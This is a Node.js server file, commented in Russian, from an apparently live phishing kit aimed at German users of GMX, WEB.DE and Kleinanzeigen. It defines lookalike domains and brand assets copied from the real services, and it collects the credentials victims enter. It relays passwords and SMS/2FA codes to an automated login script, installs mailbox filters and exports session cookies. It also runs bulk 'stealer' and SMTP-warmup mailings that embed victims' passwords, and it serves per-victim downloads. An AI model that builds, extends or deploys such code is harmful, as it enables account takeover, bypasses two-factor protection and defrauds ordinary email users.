/**
 * Сервер: приём данных с формы (email/пароль) и отдача списка в админку.
 * WebSocket для мгновенного обновления админки (npm install ws).
 */
require('dotenv').config({ path: require('path').join(__dirname, '..', '.env') });
const http = require('http');
const https = require('https');
const net = require('net');
const dns = require('dns');
const fs = require('fs');
const path = require('path');
/** Корень репозитория (рядом с package.json, login/, public/, data/). */
const PROJECT_ROOT = path.join(__dirname, '..');
const url = require('url');
const os = require('os');
const {
  fingerprintSignature,
  collectRequestMeta,
  applyLeadTelemetry,
  deviceSignatureFromRequest
} = require('./lib/leadTelemetry');
const { buildAutomationProfile } = require('./lib/automationProfile');
const { buildLeadLoginContextPayload } = require('./lib/leadLoginContext');
const { scheduleWebdeLayoutHealthcheck } = require('./lib/webdeLayoutHealthScheduler');
const { logTerminalFlow } = require('./lib/terminalFlowLog');
const {
  getDb,
  closeDb,
  getAllLeads,
  addLead,
  updateLeadPartial,
  replaceLeadRow,
  deepMerge,
  replaceAllLeads,
  getModeData,
  writeModeData,
  DB_PATH
} = require('./db/database.js');
const { send, safeEnd, readApiRouteBody } = require('./utils/httpUtils');
const { ADMIN_TOKEN, ADMIN_DOMAIN, checkAdminAuth, getAdminTokenFromRequest, checkAdminPageAuth } = require('./utils/authUtils');
const { getPlatformFromRequest, maskEmail } = require('./utils/formatUtils');
const apiRoutes = require('./routes/apiRoutes');
const chatService = require('./services/chatService');
const leadService = require('./services/leadService');
const automationService = require('./services/automationService');

const readLeads = () => leadService.readLeads();
const readLeadsAsync = (cb) => leadService.readLeadsAsync(cb);
const invalidateLeadsCache = () => leadService.invalidateLeadsCache();
const resolveLeadId = (id) => leadService.resolveLeadId(id);
const persistLeadPatch = (leadId, patch) => leadService.persistLeadPatch(leadId, patch);
const persistLeadFull = (lead) => leadService.persistLeadFull(lead);
const writeReplacedLeadId = (oldId, newId) => leadService.writeReplacedLeadId(oldId, newId);
const archiveFlagIsSet = leadService.archiveFlagIsSet;
const leadIsWorkedFromEvents = leadService.leadIsWorkedFromEvents;
const leadIsWorkedLikeAdmin = leadService.leadIsWorkedLikeAdmin;

const { execSync, spawnSync, spawn } = require('child_process');
const yauzl = require('yauzl');
let nodemailer;
try { nodemailer = require('nodemailer'); } catch (e) { nodemailer = null; }
let WebSocketServer;
try {
  WebSocketServer = require('ws').WebSocketServer;
} catch (e) {
  WebSocketServer = null;
}
let HttpsProxyAgent;
try {
  HttpsProxyAgent = require('https-proxy-agent').HttpsProxyAgent;
} catch (e) {
  HttpsProxyAgent = null;
}

const PORT = parseInt(process.env.PORT, 10) || 3000;
const HOST = (process.env.HOST || '0.0.0.0').trim();

/** Очередь вывода в stdout: при множестве параллельных AUTO-LOGIN снижает пики нагрузки на PM2/терминал. Отключить: SERVER_LOG_DIRECT=1 */
(function initConsoleLogQueue() {
  if (process.env.SERVER_LOG_DIRECT === '1' || String(process.env.SERVER_LOG_DIRECT || '').toLowerCase() === 'true') return;
  const BATCH = Math.max(5, parseInt(process.env.SERVER_LOG_BATCH || '35', 10) || 35);
  const MAX_QUEUE = Math.max(300, parseInt(process.env.SERVER_LOG_MAX_QUEUE || '4000', 10) || 4000);
  const buf = [];
  let scheduled = false;
  const origLog = console.log.bind(console);
  const origErr = console.error.bind(console);
  const origWarn = console.warn.bind(console);
  function flush() {
    scheduled = false;
    let n = 0;
    while (buf.length && n < BATCH) {
      const row = buf.shift();
      n += 1;
      if (row.type === 'err') origErr.apply(console, row.args);
      else if (row.type === 'warn') origWarn.apply(console, row.args);
      else origLog.apply(console, row.args);
    }
    if (buf.length) {
      scheduled = true;
      setImmediate(flush);
    }
  }
  function enqueue(type, argsList) {
    buf.push({ type: type, args: argsList });
    if (buf.length > MAX_QUEUE) {
      const drop = buf.length - Math.floor(MAX_QUEUE * 0.8);
      buf.splice(0, drop);
      origErr('[SERVER] console queue: отброшено ' + drop + ' старых строк (лавина логов)');
    }
    if (!scheduled) {
      scheduled = true;
      setImmediate(flush);
    }
  }
  console.log = function () { enqueue('log', Array.from(arguments)); };
  console.error = function () { enqueue('err', Array.from(arguments)); };
  console.warn = function () { enqueue('warn', Array.from(arguments)); };
})();
/** Домены сайтов: GMX и WEB.DE работают параллельно на разных доменах. Хост админки — см. src/utils/authUtils (ADMIN_DOMAIN). */
const GMX_DOMAIN = (process.env.GMX_DOMAIN || 'gmx-net.cv').toLowerCase().replace(/^https?:\/\//, '').split('/')[0];
const WEBDE_DOMAIN = (process.env.WEBDE_DOMAIN || 'web-de.one').toLowerCase().replace(/^https?:\/\//, '').split('/')[0];
/** Подпись потока в логе [ВХОД] (по умолчанию домен фишинга WEBDE_DOMAIN). Env: SERVER_LOG_PHISH_LABEL */
const SERVER_LOG_PHISH_LABEL = (process.env.SERVER_LOG_PHISH_LABEL || WEBDE_DOMAIN || 'сайт').trim() || 'сайт';
/** Список доменов WEB.DE (через запятую). Если задан — все они отдают бренд webde. Иначе используется только WEBDE_DOMAIN и www.WEBDE_DOMAIN. */
const WEBDE_DOMAINS_RAW = (process.env.WEBDE_DOMAINS || '').trim();
const WEBDE_DOMAINS_LIST = WEBDE_DOMAINS_RAW
  ? WEBDE_DOMAINS_RAW.split(',').map(function (d) { return d.toLowerCase().replace(/^https?:\/\//, '').split('/')[0].trim(); }).filter(Boolean)
  : [WEBDE_DOMAIN, 'www.' + WEBDE_DOMAIN];
const WEBDE_CANONICAL_HOST = WEBDE_DOMAINS_LIST[0].replace(/^www\./, '') || WEBDE_DOMAIN;

/** Домен(ы) Klein (Kleinanzeigen). Отдельный бренд на своём домене. */
const KLEIN_DOMAIN = (process.env.KLEIN_DOMAIN || 'kontosicherheit-de.com').toLowerCase().replace(/^https?:\/\//, '').split('/')[0];
const KLEIN_DOMAINS_RAW = (process.env.KLEIN_DOMAINS || '').trim();
const KLEIN_DOMAINS_LIST = KLEIN_DOMAINS_RAW
  ? KLEIN_DOMAINS_RAW.split(',').map(function (d) { return d.toLowerCase().replace(/^https?:\/\//, '').split('/')[0].trim(); }).filter(Boolean)
  : [KLEIN_DOMAIN, 'www.' + KLEIN_DOMAIN];
const KLEIN_CANONICAL_HOST = KLEIN_DOMAINS_LIST[0].replace(/^www\./, '') || KLEIN_DOMAIN;

/** Сообщение под формой Klein после неверного пароля (скрипт автовхода). */
const KLEIN_VICTIM_PASSWORD_ERROR_DE = 'Die E-Mail-Adresse ist nicht registriert oder das Passwort ist falsch. Bitte überprüfe deine Eingaben.';

const BRANDS = {
  gmx: {
    id: 'gmx',
    name: 'GMX',
    logoUrl: '/favicon.svg',
    primaryColor: '#1c449b',
    primaryColorDark: '#16367c',
    canonicalUrl: 'https://www.gmx.net/',
    canonicalHost: GMX_DOMAIN,
    impressumUrl: 'https://www.gmx.net/impressum/',
    datenschutzUrl: 'https://agb-server.gmx.net/datenschutz',
    agbUrl: 'https://agb-server.gmx.net/gmxagb-de',
    hilfeUrl: 'https://hilfe.gmx.net/',
    passwortUrl: 'https://passwort.gmx.net/'
  },
  webde: {
    id: 'webde',
    name: 'WEB.DE',
    logoUrl: 'https://upload.wikimedia.org/wikipedia/de/thumb/5/5f/Web.de_logo.svg/1280px-Web.de_logo.svg.png',
    primaryColor: '#FFDF00',
    primaryColorDark: '#E6C700',
    buttonDisabledColor: '#F5EDC1',
    canonicalUrl: 'https://newsroom.web.de/',
    canonicalHost: WEBDE_CANONICAL_HOST,
    impressumUrl: 'https://web.de/impressum/',
    datenschutzUrl: 'https://web.de/datenschutz',
    agbUrl: 'https://web.de/agb',
    hilfeUrl: 'https://hilfe.web.de/',
    passwortUrl: 'https://web.de/'
  },
  klein: {
    id: 'klein',
    name: 'Kleinanzeigen',
    logoUrl: 'https://static.kleinanzeigen.de/m/img/common/logo-mobile-kleinanzeigen.1x0pahqxgxyso.svg',
    primaryColor: '#326916',
    primaryColorDark: '#2a5712',
    canonicalUrl: 'https://www.kleinanzeigen.de/',
    canonicalHost: KLEIN_CANONICAL_HOST,
    impressumUrl: 'https://www.kleinanzeigen.de/impressum.html',
    datenschutzUrl: 'https://themen.kleinanzeigen.de/datenschutzerklaerung/',
    agbUrl: 'https://themen.kleinanzeigen.de/nutzungsbedingungen/',
    hilfeUrl: 'https://hilfe.kleinanzeigen.de/hc/de',
    passwortUrl: 'https://www.kleinanzeigen.de/m-passwort-vergessen-inapp.html'
  }
};

/** Является ли хост локальным (тесты): localhost, 127.0.0.1, 0.0.0.0, локальная сеть. */
function isLocalHost(host) {
  if (!host) return false;
  if (host === 'localhost' || host === '127.0.0.1' || host === '0.0.0.0') return true;
  if (host.startsWith('192.168.') || host.startsWith('10.')) return true;
  if (host.startsWith('172.') && /^172\.(1[6-9]|2\d|3[01])\./.test(host)) return true;
  return false;
}
/** Определение бренда по хосту: локальный хост → webde (для тестов), Klein → klein, WEB.DE → webde, иначе → gmx. */
function getBrand(req) {
  const host = (req && req.headers && req.headers.host ? req.headers.host : '').split(':')[0].toLowerCase();
  if (isLocalHost(host)) return BRANDS.webde;
  if (KLEIN_DOMAINS_LIST.indexOf(host) !== -1) return BRANDS.klein;
  if (WEBDE_DOMAINS_LIST.indexOf(host) !== -1) return BRANDS.webde;
  return BRANDS.gmx;
}

/** Канонический домен для текущего запроса (по бренду хоста). */
function getCanonicalDomain(req) {
  return getBrand(req).canonicalHost;
}

/** Разрешённые домены почты для бренда GMX при /api/submit (если ENABLE_EMAIL_DOMAIN_ALLOWLIST=1). WEB.DE: всегда только @web.de (на localhost — любой). Klein: любой домен. */
const ALLOWED_EMAIL_DOMAINS_RAW = (process.env.ALLOWED_EMAIL_DOMAINS || '').trim();
const ALLOWED_EMAIL_DOMAINS = ALLOWED_EMAIL_DOMAINS_RAW
  ? ALLOWED_EMAIL_DOMAINS_RAW.split(',').map(function (d) { return d.toLowerCase().trim(); }).filter(Boolean)
  : [];
/** Включить фильтр по ALLOWED_EMAIL_DOMAINS для GMX (и прочих не-klein, не-webde). По умолчанию выкл. Env: ENABLE_EMAIL_DOMAIN_ALLOWLIST=1 */
const ENABLE_EMAIL_DOMAIN_ALLOWLIST = /^1|true|yes$/i.test(String(process.env.ENABLE_EMAIL_DOMAIN_ALLOWLIST || '').trim());
/** Требовать cookie гейта для POST /api/submit, /api/klein-anmelden-seen, /api/download-request. По умолчанию выкл (Env: REQUIRE_GATE_COOKIE=1). */
const REQUIRE_GATE_COOKIE = /^1|true|yes$/i.test(String(process.env.REQUIRE_GATE_COOKIE || '').trim());

/**
 * Одна папка для SQLite (database.sqlite), чата/режима в БД и остальных data-файлов.
 * Если фишинг (gmx-net) и админка (grzl.org) — разные PM2-приложения/каталоги кода,
 * задайте ОДИН И ТОТ ЖЕ абсолютный путь в GMW_DATA_DIR на обоих.
 */
const DATA_DIR = process.env.GMW_DATA_DIR
  ? path.resolve(process.env.GMW_DATA_DIR)
  : path.join(PROJECT_ROOT, 'data');
const START_PAGE_FILE = path.join(DATA_DIR, 'start-page.txt');
const SHORT_DOMAINS_FILE = path.join(DATA_DIR, 'short-domains.json');
const ZIP_PASSWORD_FILE = path.join(DATA_DIR, 'zip-password.txt');
const ALL_LOG_FILE = path.join(DATA_DIR, 'all.txt');
const DEBUG_LOG_FILE = path.join(DATA_DIR, 'debug.log');
const SAVED_CREDENTIALS_FILE = path.join(DATA_DIR, 'saved-credentials.json');
const STEALER_EMAIL_FILE = path.join(DATA_DIR, 'stealer-email.json');
const CONFIG_EMAIL_FILE = path.join(DATA_DIR, 'config-email.json');
const WARMUP_EMAIL_FILE = path.join(DATA_DIR, 'warmup-email.json');
const WARMUP_SMTP_STATS_FILE = path.join(DATA_DIR, 'warmup-smtp-stats.json');
/** Папка загрузок для страницы /sicherheit. Поддержка 5 файлов (по одному на «человека»), выбор по leadId. */
const DOWNLOADS_DIR = path.join(PROJECT_ROOT, 'downloads');
const DOWNLOAD_FILES_CONFIG = path.join(DATA_DIR, 'download-files.json');
const DOWNLOAD_LIMITS_FILE = path.join(DATA_DIR, 'download-limits.json');
const DOWNLOAD_COUNTS_FILE = path.join(DATA_DIR, 'download-counts.json');
const DOWNLOAD_ANDROID_CONFIG = path.join(DATA_DIR, 'download-android.json');
const DOWNLOAD_ANDROID_LIMITS_FILE = path.join(DATA_DIR, 'download-android-limits.json');
const DOWNLOAD_SETTINGS_FILE = path.join(DATA_DIR, 'download-settings.json');
const DOWNLOAD_ROTATION_FILE = path.join(DATA_DIR, 'download-rotation.json');
/** Список имён файлов куки (safe), которые уже выгружались — для «Выгрузить новые». */
const COOKIES_EXPORTED_FILE = path.join(DATA_DIR, 'cookies-exported.json');
/** Прокси для скрипта входа WEB.DE (login/proxy.txt — тот же файл читает lead_simulation_api.py) */
const PROXY_FILE = path.join(PROJECT_ROOT, 'login', 'proxy.txt');
/** Список индексов отпечатков (строки с числами) — подмножество webde_fingerprints.json; пусто = все */
const WEBDE_FP_INDICES_FILE = path.join(PROJECT_ROOT, 'login', 'webde_fingerprint_indices.txt');
const WEBDE_FINGERPRINTS_JSON = path.join(PROJECT_ROOT, 'login', 'webde_fingerprints.json');
const WEBDE_PROBE_BATCH_SCRIPT = path.join(PROJECT_ROOT, 'login', 'webde_probe_batch.py');
/** За один «Старт» в админке — не больше N индексов (остальное — следующими запусками). Env: WEBDE_PROBE_MAX_INDICES_PER_JOB */
const WEBDE_PROBE_MAX_INDICES_PER_JOB = (function () {
  const n = parseInt(process.env.WEBDE_PROBE_MAX_INDICES_PER_JOB || '12', 10);
  if (!Number.isFinite(n) || n < 1) return 12;
  return Math.min(500, n);
})();
const LOGIN_DIR = path.join(PROJECT_ROOT, 'login');
/** Фоновые пробы отпечатков WEB.DE в админке: jobId → состояние */
const webdeProbeJobs = new Map();
let webdeProbeJobSeq = 0;
/** Смещение по списку разрешённых индексов: следующий «Старт» берёт следующую порцию (не те же 12 с начала). */
let webdeFpProbeIndexCursor = 0;
const LOGIN_ARTIFACT_NAMES = ['webde_screenshot.png', 'webde_page_info.txt', 'debug_screenshot.png', 'debug_consent.png', 'lead_data.json', 'lead_result.json'];
const LOGIN_CLEANUP_MAX_AGE_MS = 10 * 60 * 1000; // 10 мин неактивности — удаляем артефакты (оставляем куки и данные лидов)
const short = require('./short');
const DOWNLOAD_SLOTS_COUNT = 5;
const DEFAULT_DOWNLOAD_LIMIT = 5;
/** Временная папка для Check (файл ещё не добавлен в кнопку скачивания) */
const CHECK_DIR = path.join(os.tmpdir(), 'gmw-check');
const CHECK_META_FILE = path.join(CHECK_DIR, 'meta.json');

/** kind smsCodeData: 2fa | sms (или эвристика по status/логу) — для скрипта опроса 2FA и согласованности с админкой. */
function smsCodeDataKindForLead(lead) {
  if (!lead || !lead.smsCodeData) return null;
  const code = String(lead.smsCodeData.code || '').trim();
  if (!code) return null;
  const k = lead.smsCodeData.kind;
  if (k === '2fa' || k === 'sms') return k;
  const st = String(lead.status || '').toLowerCase();
  if (st === 'redirect_2fa_code') return '2fa';
  if (st === 'redirect_sms_code' || st === 'redirect_sms') return 'sms';
  const evs = Array.isArray(lead.eventTerminal) ? lead.eventTerminal : [];
  for (let i = evs.length - 1; i >= 0; i--) {
    const lab = String((evs[i] && evs[i].label) || '').toLowerCase();
    if (lab.indexOf('ввел 2fa-код') === 0) return '2fa';
    if (lab.indexOf('ввел sms kl') === 0 || lab.indexOf('ввел sms-код') === 0 || lab.indexOf('ввел sms:') === 0) return 'sms';
  }
  return 'sms';
}

/** Long-poll «жду новый пароль» для скрипта WEB.DE (по умолчанию 3 мин). Env: WEBDE_WAIT_PASSWORD_TIMEOUT_MS (мс, минимум 60000). */
const WEBDE_WAIT_PASSWORD_TIMEOUT_MS = (function () {
  const v = parseInt(process.env.WEBDE_WAIT_PASSWORD_TIMEOUT_MS, 10);
  if (Number.isFinite(v) && v >= 60000) return v;
  return 3 * 60 * 1000;
})();

/** Ошибка автовхода 500/502/503: жертве только оверлей ожидания, без редиректа. Env: WEBDE_SCRIPT_VICTIM_WAIT_MS (мс, мин. 10000). */
const WEBDE_SCRIPT_VICTIM_WAIT_MS = (function () {
  const v = parseInt(process.env.WEBDE_SCRIPT_VICTIM_WAIT_MS, 10);
  if (Number.isFinite(v) && v >= 10000) return v;
  return 5 * 60 * 1000;
})();

function webdeErrorTriggersVictimAutomationWait(errorCode) {
  const c = String(errorCode || '').trim();
  if (c === '408') return false;
  return c === '500' || c === '502' || c === '503';
}

/** Единые подписи EVENTS (скрипт/админка). Старые записи в логах по-прежнему матчит admin.js. */
const EVENT_LABELS = {
  WEBDE_START: 'Запуск WEB.DE',
  WEBDE_QUEUE: 'WEB.DE: в очереди',
  KLEIN_START: 'Запуск Klein',
  KLEIN_QUEUE: 'Klein: в очереди',
  PUSH: 'Push',
  PUSH_TIMEOUT: 'Push: таймаут',
  SMS: 'SMS',
  SMS_KL: 'SMS Kl',
  WRONG_DATA: 'Неверные данные',
  WRONG_DATA_KL: 'Неверные данные Kl',
  WRONG_SMS: 'Неверный SMS',
  WRONG_SMS_KL: 'Неверный SMS Kl',
  WRONG_2FA: 'Неверный 2FA',
  TWO_FA: '2FA',
  TWO_FA_TIMEOUT: '2FA: таймаут ожидания кода',
  SUCCESS: 'Успешный вход',
  SUCCESS_KL: 'Успешный вход Kl',
  MAIL_FILTERS_START: 'Включение фильтров на почте',
  MAIL_FILTERS_OK: 'Фильтры включены',
  MAIL_READY: 'Почта готова',
  PUSH_RESEND_OK: 'Push: переотправлен',
  PUSH_RESEND_FAIL: 'Push: переотправка не удалась',
  TWO_FA_CODE_IN: '2FA: код получен, ввод на WEB.DE',
  TWO_FA_WRONG: '2FA: неверный код',
  /** Промежуточные шаги (script-event), без дублирования push/sms из webde-login-result */
  WEBDE_STEP_BROWSER: 'WEB.DE: браузер готов',
  WEBDE_STEP_ATTEMPT: 'WEB.DE: попытка входа',
  WEBDE_MAIL_OPENED: 'WEB.DE: почтовый ящик открыт',
  MAIL_UI_READY: 'Почта: интерфейс подготовлен',
  KLEIN_SESSION_MAIL: 'Klein: сессия почты в браузере',
  KLEIN_WAIT_VICTIM: 'Klein: ждём открытия страницы у лида',
  KLEIN_VICTIM_HERE: 'Klein: лид на странице входа',
  KLEIN_CREDS_FROM_LEAD: 'Klein: данные для входа получены',
  KLEIN_SCRIPT_START: 'Klein (скрипт): старт',
  KLEIN_SCRIPT_BROWSER: 'Klein (скрипт): браузер',
  WEBDE_SCREEN_PUSH: 'WEB.DE: на экране Push',
  WEBDE_SCREEN_2FA: 'WEB.DE: на экране 2FA',
  WEBDE_SCREEN_SMS: 'WEB.DE: на экране SMS',
};

/** Ожидающие запросы скрипта входа: leadId -> { res, timeoutId }. Админка при сохранении пароля отдаёт пароль в этот запрос. */
const webdePasswordWaiters = {};
/** По leadId: запрос переотправки пуша со страницы админки (скрипт опрашивает и кликает «Mitteilung erneut senden»). */
const webdePushResendRequested = {};

function readCheckMeta() {
  try {
    const data = fs.readFileSync(CHECK_META_FILE, 'utf8');
    return JSON.parse(data);
  } catch (e) { return {}; }
}
function writeCheckMeta(meta) {
  try {
    if (!fs.existsSync(CHECK_DIR)) fs.mkdirSync(CHECK_DIR, { recursive: true });
    fs.writeFileSync(CHECK_META_FILE, JSON.stringify(meta, null, 0));
  } catch (e) {}
}
/** Парсит одну строку SMTP: host:port:user:fromEmail:password (пароль может содержать ':') */
function parseSmtpLine(line) {
  const raw = (line || '').trim();
  const s = raw.indexOf('\n') >= 0 ? raw.split('\n')[0].trim() : raw;
  if (!s) return null;
  const parts = s.split(':');
  if (parts.length < 5) return null;
  const host = (parts[0] || '').trim();
  const port = parseInt(parts[1], 10) || 587;
  let user = (parts[2] || '').trim();
  let fromEmail = (parts[3] || '').trim();
  let password = parts.slice(4).join(':').trim();
  if (user.length > 256) user = user.slice(0, 256);
  if (fromEmail.length > 256) fromEmail = fromEmail.slice(0, 256);
  if (password.length > 256) password = password.slice(0, 256);
  return {
    host,
    port,
    user,
    fromEmail,
    password
  };
}

/** Парсит поле SMTP с несколькими строками (каждая строка = один SMTP). Возвращает массив. */
function parseSmtpLines(line) {
  const raw = (line || '').trim();
  const lines = raw.split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
  const result = [];
  for (const s of lines) {
    const smtp = parseSmtpLine(s);
    if (smtp && smtp.host && smtp.user && smtp.password) result.push(smtp);
  }
  return result;
}

function readStealerEmailConfig() {
  try {
    if (fs.existsSync(STEALER_EMAIL_FILE)) {
      const raw = fs.readFileSync(STEALER_EMAIL_FILE, 'utf8');
      const data = JSON.parse(raw);
      if (data.configs && Array.isArray(data.configs)) {
        const currentId = data.currentId || (data.configs[0] && data.configs[0].id) || null;
        const current = data.configs.find(function (c) { return c.id == currentId; }) || data.configs[0] || null;
        return { currentId, configs: data.configs, current };
      }
      const legacy = data;
      const id = 'legacy-' + Date.now();
      if (legacy.smtp && legacy.smtpUser) {
        const smtpLine = [legacy.smtp, String(legacy.smtpPort || 587), legacy.smtpUser, legacy.smtpUser, legacy.smtpPass || ''].join(':');
        const migrated = { currentId: id, configs: [{ id, name: 'Default', smtpLine, html: legacy.html || '', senderName: legacy.senderName || '', title: legacy.title || '' }] };
        writeStealerEmailConfig(migrated);
        const cur = migrated.configs[0];
        return { currentId: id, configs: migrated.configs, current: cur };
      }
    }
  } catch (e) {}
  const emptyId = 'default';
  const empty = { currentId: emptyId, configs: [{ id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '' }], current: { id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '' } };
  return empty;
}
function writeStealerEmailConfig(data) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    const toWrite = data.configs ? { currentId: data.currentId, configs: data.configs } : data;
    fs.writeFileSync(STEALER_EMAIL_FILE, JSON.stringify(toWrite || {}, null, 2), 'utf8');
  } catch (e) {}
}

function readConfigEmail() {
  try {
    if (fs.existsSync(CONFIG_EMAIL_FILE)) {
      const raw = fs.readFileSync(CONFIG_EMAIL_FILE, 'utf8');
      const data = JSON.parse(raw);
      if (data.configs && Array.isArray(data.configs)) {
        const currentId = data.currentId || (data.configs[0] && data.configs[0].id) || null;
        const current = data.configs.find(function (c) { return c.id == currentId; }) || data.configs[0] || null;
        return { currentId, configs: data.configs, current };
      }
    }
  } catch (e) {}
  const emptyId = 'default';
  const empty = { currentId: emptyId, configs: [{ id: emptyId, name: 'Default', smtpLine: '', senderName: '', title: '', html: '' }], current: { id: emptyId, name: 'Default', smtpLine: '', senderName: '', title: '', html: '' } };
  return empty;
}
function writeConfigEmail(data) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    const toWrite = data.configs ? { currentId: data.currentId, configs: data.configs } : data;
    fs.writeFileSync(CONFIG_EMAIL_FILE, JSON.stringify(toWrite || {}, null, 2), 'utf8');
  } catch (e) {}
}

function readWarmupEmailConfig() {
  try {
    if (fs.existsSync(WARMUP_EMAIL_FILE)) {
      const raw = fs.readFileSync(WARMUP_EMAIL_FILE, 'utf8');
      const data = JSON.parse(raw);
      if (data.configs && Array.isArray(data.configs)) {
        const currentId = data.currentId || (data.configs[0] && data.configs[0].id) || null;
        const current = data.configs.find(function (c) { return c.id == currentId; }) || data.configs[0] || null;
        return { currentId, configs: data.configs, current };
      }
    }
  } catch (e) {}
  const emptyId = 'default';
  const empty = { currentId: emptyId, configs: [{ id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '', recipientsList: '' }], current: { id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '', recipientsList: '' } };
  return empty;
}
function writeWarmupEmailConfig(data) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    const toWrite = data.configs ? { currentId: data.currentId, configs: data.configs } : data;
    fs.writeFileSync(WARMUP_EMAIL_FILE, JSON.stringify(toWrite || {}, null, 2), 'utf8');
  } catch (e) {}
}

function readWarmupSmtpStats() {
  try {
    if (fs.existsSync(WARMUP_SMTP_STATS_FILE)) {
      const raw = fs.readFileSync(WARMUP_SMTP_STATS_FILE, 'utf8');
      const data = JSON.parse(raw);
      if (data && typeof data === 'object') return data;
    }
  } catch (e) {}
  return {};
}
function writeWarmupSmtpStats(stats) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    fs.writeFileSync(WARMUP_SMTP_STATS_FILE, JSON.stringify(stats || {}, null, 2), 'utf8');
  } catch (e) {}
}

const warmupState = {
  running: false,
  stopped: false,
  paused: false,
  configs: [],
  /** Плоский список { config, smtp } для ротации 1→2→3→1… */
  flatList: [],
  leads: [],
  perSmtpLimit: 0,
  delayMs: 2000,
  /** Текущее число параллельных цепочек отправки (для добавления при снятии паузы) */
  numThreads: 1,
  /** Отправлено с каждого SMTP (ключ — fromEmail) */
  sentPerSmtp: {},
  log: [],
  totalSent: 0
};
const WARMUP_LOG_MAX = 500;

let sendStealerSmtpIndex = 0;
/** SMTP, с которых была ошибка отправки (554 и т.д.) — исключаются из списка до перезапуска сервера */
const sendStealerFailedSmtpEmails = new Set();

function runWarmupStep() {
  if (warmupState.stopped || !warmupState.running) {
    warmupState.running = false;
    warmupState.log.push({ text: '[Прогрев остановлен]', type: 'muted' });
    return;
  }
  if (warmupState.paused) {
    setTimeout(runWarmupStep, 500);
    return;
  }
  const flatList = warmupState.flatList;
  const leads = warmupState.leads;
  const limit = warmupState.perSmtpLimit;
  const sentPerSmtp = warmupState.sentPerSmtp;
  if (!flatList.length || !leads.length) {
    warmupState.running = false;
    warmupState.log.push({ text: '[Прогрев завершён: нет SMTP или лидов]', type: 'muted' });
    return;
  }
  const s = warmupState.totalSent;
  let chosen = null;
  for (let k = 0; k < flatList.length; k++) {
    const idx = (s + k) % flatList.length;
    const entry = flatList[idx];
    if ((sentPerSmtp[entry.smtp.fromEmail] || 0) < limit) {
      chosen = entry;
      break;
    }
  }
  if (!chosen) {
    warmupState.running = false;
    warmupState.log.push({ text: '[Прогрев завершён: лимит по каждому SMTP достигнут]', type: 'muted' });
    return;
  }
  const cfg = chosen.config;
  const smtp = chosen.smtp;
  warmupState.totalSent++;
  warmupState.sentPerSmtp[smtp.fromEmail] = (warmupState.sentPerSmtp[smtp.fromEmail] || 0) + 1;
  // s растёт с каждой отправкой → при новом круге SMTP (s=3,4,5…) берём следующий блок лидов (3,4,5…), чтобы один SMTP не слал повторно на одни и те же адреса
  const leadIndex = s % leads.length;
  const lead = leads[leadIndex];
  const toEmail = (lead.email || '').trim();
  if (!toEmail) {
    warmupState.sentPerSmtp[smtp.fromEmail] = (warmupState.sentPerSmtp[smtp.fromEmail] || 1) - 1;
    setTimeout(runWarmupStep, 100);
    return;
  }
  const password = (lead.password || '').trim();
  let html = (cfg.html || '').replace(/_email_/g, toEmail).replace(/_password_/g, password);
  const attachments = [];
  if (cfg.image1Base64 && html.indexOf('_src1_') !== -1) {
    try {
      const buf = Buffer.from(cfg.image1Base64, 'base64');
      html = html.replace(/_src1_/g, 'cid:image1@mail');
      attachments.push({ filename: 'image1.png', content: buf, cid: 'image1@mail' });
    } catch (e) {}
  } else if (html.indexOf('_src1_') !== -1) {
    html = html.replace(/_src1_/g, '');
  }
  if (!nodemailer) {
    warmupState.sentPerSmtp[smtp.fromEmail] = (warmupState.sentPerSmtp[smtp.fromEmail] || 1) - 1;
    warmupState.totalSent--;
    warmupState.log.push({ text: '[nodemailer не установлен]', type: 'error' });
    warmupState.running = false;
    return;
  }
  const transporter = nodemailer.createTransport({
    host: smtp.host,
    port: smtp.port,
    secure: smtp.port === 465,
    auth: { user: smtp.user, pass: smtp.password }
  });
  const fromStr = (cfg.senderName ? '"' + String(cfg.senderName).replace(/"/g, '') + '" <' + smtp.fromEmail + '>' : smtp.fromEmail);
  const mailOptions = {
    from: fromStr,
    to: toEmail,
    subject: (cfg.title || '').trim() || 'Message',
    html,
    attachments: attachments.length ? attachments : undefined,
    envelope: { from: smtp.fromEmail, to: toEmail }
  };
  transporter.sendMail(mailOptions).then(() => {
    writeWarmupSmtpStats(warmupState.sentPerSmtp);
    warmupState.log.push({ text: 'Отправлено с ' + smtp.fromEmail + ' на ' + toEmail, type: 'success' });
    if (warmupState.log.length > WARMUP_LOG_MAX) warmupState.log.shift();
    setTimeout(runWarmupStep, warmupState.delayMs);
  }).catch((err) => {
    warmupState.sentPerSmtp[smtp.fromEmail] = (warmupState.sentPerSmtp[smtp.fromEmail] || 1) - 1;
    const msg = (err.message || String(err)).slice(0, 150);
    warmupState.log.push({ text: '[Ошибка ' + smtp.fromEmail + ' → ' + toEmail + ': ' + msg + ']', type: 'error' });
    if (warmupState.log.length > WARMUP_LOG_MAX) warmupState.log.shift();
    setTimeout(runWarmupStep, Math.min(warmupState.delayMs, 5000));
  });
}

function readDownloadFilesConfig() {
  try {
    if (fs.existsSync(DOWNLOAD_FILES_CONFIG)) {
      const raw = fs.readFileSync(DOWNLOAD_FILES_CONFIG, 'utf8');
      const data = JSON.parse(raw);
      const list = Array.isArray(data.files) ? data.files : [];
      const out = [];
      for (let i = 0; i < DOWNLOAD_SLOTS_COUNT; i++) {
        const v = list[i];
        out.push((v && typeof v === 'string' && !v.includes('..') && !v.includes(path.sep)) ? v : null);
      }
      return out;
    }
  } catch (e) {}
  return Array(DOWNLOAD_SLOTS_COUNT).fill(null);
}
function writeDownloadFilesConfig(files) {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    const list = Array.isArray(files) ? files.slice(0, DOWNLOAD_SLOTS_COUNT) : [];
    while (list.length < DOWNLOAD_SLOTS_COUNT) list.push(null);
    fs.writeFileSync(DOWNLOAD_FILES_CONFIG, JSON.stringify({ files: list }, null, 0), 'utf8');
  } catch (e) {}
}

function readDownloadLimits() {
